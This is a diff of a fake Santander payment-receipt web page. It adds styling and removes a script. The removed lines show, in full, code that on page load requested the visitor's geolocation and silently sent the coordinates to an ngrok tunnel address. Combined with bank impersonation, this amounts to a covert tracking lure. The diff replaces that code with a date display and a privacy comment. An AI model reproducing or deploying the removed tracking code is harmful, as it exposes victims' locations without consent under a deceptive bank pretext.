@@ -6,6 +6,59 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Comprovante de Recebimento - SANTANDER</title>
   <link rel="stylesheet" href="styles.css" />
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f4f4f4;
+      padding: 20px;
+    }
+
+    .comprovante-container {
+      background: #fff;
+      padding: 20px;
+      max-width: 600px;
+      margin: auto;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+
+    .informacoes p {
+      margin: 10px 0;
+    }
+
+    .informacoes span {
+      font-weight: bold;
+    }
+
+    .botao {
+      margin-top: 20px;
+      padding: 10px 20px;
+      background-color: #d50000;
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    .botao:hover {
+      background-color: #b71c1c;
+    }
+
+    .comprovante-footer {
+      margin-top: 30px;
+      font-size: 0.9em;
+      color: #555;
+    }
+
+    .comprovante-footer a {
+      color: #d50000;
+      text-decoration: none;
+    }
+
+    .comprovante-footer a:hover {
+      text-decoration: underline;
+    }
+  </style>
 </head>
 
 <body>
@@ -25,67 +78,21 @@
       <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
       <p><a href="#">Clique aqui</a> para mais informações.</p>
     </div>
-
   </div>
 
   <script>
-    window.addEventListener("load", () => {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
-      } else {
-        alert("Algo deu errado. Tente novamente mais tarde.");
-      }
+    // Exibir data atual formatada
+    window.addEventListener("DOMContentLoaded", () => {
+      const dataAtual = new Date();
+      const dia = String(dataAtual.getDate()).padStart(2, '0');
+      const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
+      const ano = dataAtual.getFullYear();
+      const dataFormatada = `${dia}/${mes}/${ano}`;
+      document.getElementById("data-atual").textContent = dataFormatada;
     });
 
-    const dataAtual = new Date();
-    const dia = String(dataAtual.getDate()).padStart(2, '0');
-    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
-    const ano = dataAtual.getFullYear();
-
-    const dataFormatada = `${dia}/${mes}/${ano}`;
-
-    document.getElementById("data-atual").textContent = dataFormatada;
-
-    console.log(dataAtual)
-
-  function sendLocation(position) {
-  if (!position || !position.coords) {
-    console.error("Posição inválida.");
-    return;
-  }
-
-  const latitude = position.coords.latitude;
-  const longitude = position.coords.longitude;
-  const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
-
-  fetch("https://www.d8d0-201-42-106-118.ngrok-free.app/send-location", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({ latitude, longitude, maps })
-  })
-    .then(response => {
-      if (!response.ok) {
-        throw new Error(`Erro HTTP: ${response.status}`);
-      }
-      return response.json();
-    })
-    .then(data => {
-      if (!data.success) {
-        alert("Erro ao enviar o comprovante.");
-      } else {
-        console.log("Localização enviada com sucesso.");
-      }
-    })
-    .catch(error => {
-      console.error("Erro ao enviar localização:", error);
-    });
-}
-
-    function handleError(error) {
-      alert("Erro ao obter a localização: " + error.message);
-    }
+    // Geolocalização removida por motivos de privacidade
+    // Se desejar reativar no futuro, implemente com consentimento explícito
   </script>
 </body>
 
